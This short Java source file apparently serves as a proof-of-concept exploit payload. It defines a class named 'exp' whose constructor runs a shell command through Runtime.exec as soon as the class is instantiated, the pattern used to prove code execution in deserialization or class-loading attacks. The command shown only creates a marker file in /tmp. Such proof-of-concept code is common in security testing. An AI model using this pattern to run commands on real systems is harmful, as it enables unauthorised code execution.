package web;


public class exp {
    public exp(){
        try{
            Runtime.getRuntime().exec("touch /tmp/aass");
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        exp e = new exp();
    }
}